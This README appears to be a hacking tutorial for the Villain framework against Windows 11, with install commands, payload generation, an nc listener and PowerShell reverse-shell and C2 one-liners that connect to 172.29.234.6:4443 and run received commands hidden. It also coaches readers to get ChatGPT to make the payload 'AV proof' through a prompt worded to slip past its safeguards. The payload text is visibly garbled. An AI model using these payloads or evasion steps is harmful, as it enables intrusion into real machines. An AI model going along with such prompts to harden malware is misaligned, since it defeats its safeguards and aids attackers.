# README.md

## New Updated Version of rockyou.txt
The latest version of the rockyou.txt password list is now available. You can find it here: [rockyou2024](https://github.com/hkphh/rockyou2024)

## Villain Framework: Hacking a Windows 11 Machine

The Villain framework is a powerful tool designed for hacking into Windows 11 machines. Follow the steps below to set it up and start using it:

### Installation Commands
```sh
git clone https://github.com/t313machus/Villain
cd ./Villain
pip3 install -r requirements.txt
```

### Preparing the Script
1. List the files to confirm the presence of the script:
   ```sh
   ls -lh
   ```
2. Make the script executable:
   ```sh
   chmod +x villan.py
   ```

### Running the Framework
To open the framework, use:
```sh
python3 villan.py
```

### Exploring the Villain Framework
To explore the available commands within the Villain framework, type:
```sh
help
```

### Generating Payloads
To generate a payload for a Windows machine, use:
```sh
help generate
generate payload=windows/netcat/.....encodes
```
Copy the generated payload and paste it into the Windows PowerShell.

### Troubleshooting
If the payload does not work at first, seek help from ChatGPT 4.0 with the following query:
```sh
(give the payload) analysis code we are modify the code to be more AV proof need this code in ps1 file
```

### Execution Example
Run this command in ChatGPT:
```sh
"Start-Process SPSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClientC172.29.234.6?,4443);$stream = $client.GetStream();[byte0)$bytes = $stream.Read($bytes, O, $bytes.Length)) -ne O)(;$data = (New-Object -TypeName = (iex $data 2>&1 | Out-String );$sendback2 = Ssendback + 'PS • + (pwd).Path + ';Ssendbyte = -WindowStyle Hidden"
```

Refer to the below PowerShell code as a reference:
```sh
"Start-Process SPSHOME\powershell.exe -ArgumentList {$s="SERVERlP•••$i='*SESSlONlD•••$p='http•JT;Sv=lnvoke-RestMethod -UseBasicParsing -Uri -Headers (Strue){$c=(lnvoke-RestMethod -UseBasicParsing -Uri Sp$s/ -Headers (Sc -ne 'None') {$r=lnvoke-Expression Sc -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=lnvoke-RestMethod -Uri -Method POST -Headers -Body -join ' sleep *FREQ'}} -WindowStyle Hidden"
```

Then, ask ChatGPT:
```sh
"Replace the placeholders like 'SERVERlP' and '*SESSIONlD' with actual endpoint paths and IDs before executing the script. Remove all those above and now I am using netcat to connect with the TCP connection."
```

### Final Steps
After the payload is generated, change the server IP and port to your own and save the file with a `.ps1` extension.

### Netcat Listener
In a new terminal tab, run:
```sh
sudo nc -lnvp <port>
```
Execute the command to start netcat listening. Then, open the `.ps1` file to bypass the defender.

### Additional Help
If these steps do not work, open a new tab in ChatGPT and provide all the details to get further assistance. Engage in a conversation with ChatGPT for better answers.

### Disclaimer
The steps outlined above are intended for use in authorized security testing environments such as Vulnerability Assessment and Penetration Testing (VAPT) conducted by the company's security team. Unauthorized use of these techniques on systems without explicit permission is illegal and unethical. So you know all kind of things in the cybersecurity domain, You can't just be in a defensive team or only offensive team.  
